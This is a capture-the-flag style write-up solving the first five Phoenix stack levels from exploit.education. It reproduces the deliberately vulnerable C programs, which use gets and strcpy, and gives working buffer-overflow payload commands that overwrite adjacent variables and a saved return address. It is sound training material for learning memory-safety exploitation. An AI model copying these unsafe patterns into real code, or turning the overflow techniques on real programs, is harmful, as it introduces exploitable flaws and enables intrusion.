# Stack-Zero

> This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside > of the allocated memory can modify program execution.
>

### Source code
```C
/*
 * phoenix/stack-zero, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable.
 *
 * Scientists have recently discovered a previously unknown species of
 * kangaroos, approximately in the middle of Western Australia. These
 * kangaroos are remarkable, as their insanely powerful hind legs give them
 * the ability to jump higher than a one story house (which is approximately
 * 15 feet, or 4.5 metres), simply because houses can't can't jump.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  locals.changeme = 0;
  gets(locals.buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```

To succeed in this challenge, we need to change the value of the `changeme` variable, which follows a `64-character buffer` in memory. Since changeme is declared as volatile, its memory location directly follows the buffer. The `gets` function, which reads input from stdin into the buffer, is vulnerable to `buffer overflow` attacks because it doesn't limit the number of characters copied. If the input exceeds 64 characters, it will overflow into the changeme variable's memory location, allowing us to alter its value. 

Let's enter a string that is longer than the size of the buffer, in this case we’ll add 1 extra character.
We can use this command: 
```python
$ python -c "print 'A'*65" | ./stack-zero
```

<img width="897" alt="Screenshot 2024-07-10 at 6 48 09 PM" src="https://github.com/Anjalihere/CSOC_24/assets/146505430/9b8fe205-ecf0-4c85-8248-65b202d86223">

Finally, we have changed the changme variable :)

# Stack-One

> This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.
>
> This level can be found at /opt/phoenix/<architecture>/stack-one

> Hints
>
> * man ascii can tell you what the hexadecimal characters are.
> * Having troubles? How does the endianness of the architecture affect the layout of how variables are laid out?

### Source code

```C
/*
 * phoenix/stack-one, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x496c5962
 *
 * Did you hear about the kid napping at the local school?
 * It's okay, they woke up.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  if (argc < 2) {
    errx(1, "specify an argument, to be copied into the \"buffer\"");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, argv[1]);

  if (locals.changeme ==  0x496c5962) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
        locals.changeme);
  }

  exit(0);
}
```
 This challenge is same as previous one just that now, we need to set the `changeme` variable to `0x496c5962`.


To exploit the buffer overflow vulnerability, we need to input a string longer than the 64-character buffer. By filling the buffer with 64 characters and then appending specific bytes, we can set the changeme variable to the value 0x496c5962.

However, we can't simply add the desired value after the 64 A's. Due to the little-endian architecture, data is stored in reverse order in memory. Therefore, we need to reverse the byte order of our target value to solve the challenge.

```python
 ./stack-one $(python -c 'print "A"*64 + "\x62\x59\x6c\x49"')
```

<img width="1106" alt="Screenshot 2024-07-10 at 6 47 15 PM" src="https://github.com/Anjalihere/CSOC_24/assets/146505430/0efb60c2-498f-4486-aebe-158fc9cceb80">

Hence, we have changed changme to its desired value :)

# Stack-Two
> Stack Two takes a look at environment variables, and how they can be set.

### Source code

```C
/*
 * phoenix/stack-two, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * If you're Russian to get to the bath room, and you are Finnish when you get
 * out, what are you when you are in the bath room?
 *
 * European!
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}
```
This time, we need to overflow “buffer” with an `environment variable`. Let's search for `how to set environment variable in linux` and found it: 

<img width="595" alt="Screenshot 2024-07-10 at 5 24 24 PM" src="https://github.com/Anjalihere/CSOC_24/assets/146505430/7b9aeffc-d7f6-43ec-b8eb-f015e7100d26">

The code initializes a pointer `ptr` to a string stored in the environment variable `ExploitEducation`. This string is then copied into the `buffer` variable using the `strcpy()` function without any bounds checking. Subsequently, the value of the `changeme` variable is evaluated to determine if it equals `0x0d0a090a`.

So, we’ll fill the buffer with 64 characters and then append specific bytes so that the changeme variable takes the value 0x0d0a090a and pass the string to the program via the ExploitEducation environment variable.

```python
export ExploitEducation=$(python -c 'print "A"*64 + "\x0a\x09\x0a\x0d"') && ./stack-two
```

<img width="1182" alt="Screenshot 2024-07-10 at 6 44 59 PM" src="https://github.com/Anjalihere/CSOC_24/assets/146505430/41c58139-86e3-4fb7-9083-faf1f6f7da44">

Yahoo! it changed :)

# Stack-Three
> Stack Three looks at overwriting function pointers stored on the stack.

> Hints
>
> * You can use gdb and objdump to determine where the complete_level() function is in memory.

### Source code

```C
/*
 * phoenix/stack-three, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * When does a joke become a dad joke?
 *   When it becomes apparent.
 *   When it's fully groan up.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}
```
The structure is similar to previous challenges, but now the changeme variable is replaced by a `fp (function pointer)` variable. The program attempts to call the function pointed to by fp. To complete the challenge, we need to change fp to point to the `complete_level` function, as this function is not called in the source code. Let's use `gdb` or `objdump` to get address of the complete_level function


Knowing the complete_level function address is `0x000000000040069d`, we can exploit the buffer overflow by filling the buffer with 64 'A's followed by the function's address.

<img width="1095" alt="Screenshot 2024-07-10 at 6 42 50 PM" src="https://github.com/Anjalihere/CSOC_24/assets/146505430/878a737e-2b1d-4a6c-93e0-23a8a4a1b245">

And, we have finished the level :)

# Stack-Four

> Stack Four takes a look at what can happen when you can overwrite the saved instruction pointer (standard buffer overflow).

> Hints
>
> * The saved instruction pointer is not necessarily directly after the end of variable allocations – things like compiler padding can increase the size. Did you > know that some architectures may not save the return address on the stack in all cases?
> * GDB supports “run < my_file” to direct input from my_file into the program.

### Source code

```C
/*
 * phoenix/stack-four, by https://exploit.education
 *
 * The aim is to execute the function complete_level by modifying the
 * saved return address, and pointing it to the complete_level() function.
 *
 * Why were the apple and orange all alone? Because the bananna split.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```
To exploit this program, we need to overwrite the `return address` on the stack saved by the `start_level` function call, redirecting execution to the `complete_level` function and this function starts at `0x40061d`.

<img width="927" alt="Screenshot 2024-07-10 at 7 53 00 PM" src="https://github.com/Anjalihere/CSOC_24/assets/146505430/e864e710-f6f7-4b61-98ba-dd23c017f6f9">

Let's disassemble the `main` function alongwith `start_level` function to identify where the `gets()` function is called. Setting a `breakpoint` immediately after this call to observe how the user input is stored on the stack.

<img width="750" alt="Screenshot 2024-07-10 at 7 38 44 PM" src="https://github.com/Anjalihere/CSOC_24/assets/146505430/17753648-ce47-433e-bd32-76f730292e09">

The disassembly of the main function reveals that execution continues at address `0x0040068d` after the start_level function returns. Let's set a breakpoint at `0x400649` and run the program, fill the `buffer` variable with 64 characters. Using an 'A' at the beginning, 'B's in the middle, and a 'C' at the end will help us easily identify where this data begins and ends on the stack.

<img width="1035" alt="Screenshot 2024-07-10 at 7 42 53 PM" src="https://github.com/Anjalihere/CSOC_24/assets/146505430/68d40d8b-e9a0-4339-85da-73c208996a63">

After reaching the break point, we can examine the contents of the stack starting at the stack pointer register. Let's use GDB’s `info frame` command and see where RIP is at under `Saved registers`

<img width="871" alt="Screenshot 2024-07-10 at 7 43 46 PM" src="https://github.com/Anjalihere/CSOC_24/assets/146505430/b094490f-ab6d-4651-bd6f-b389fdb0fe3d">

<img width="871" alt="Screenshot 2024-07-10 at 7 44 11 PM" src="https://github.com/Anjalihere/CSOC_24/assets/146505430/fda1d196-2693-4107-bebd-8ccf6ca2b828">


Now, we have identified the return address (0x0040068d) at memory location `0x7fffffffe648` and the start of the `buffer` variable at `0x7fffffffe5f0`. The next step is to calculate the byte difference between these two addresses. We can either use a calculator in programmer mode or let GDB handle the calculation. Once we obtain this value, we can resume execution and allow the program to exit.

<img width="582" alt="Screenshot 2024-07-10 at 8 01 22 PM" src="https://github.com/Anjalihere/CSOC_24/assets/146505430/8063b8ed-60e0-4c2a-ab24-4f5ac0f54b79">

Now, we need to overwrite the return address on the stack with `0x40061d` (complete_level function address). Let's use this command:

```python
python -c 'print "A"*88 + "\x1d\x06\x40"' | ./stack-four
```
<img width="1080" alt="Screenshot 2024-07-10 at 7 45 51 PM" src="https://github.com/Anjalihere/CSOC_24/assets/146505430/1a084f6a-170f-43cc-ae82-444e981d8e83">

Kudos! we finished this level too :)
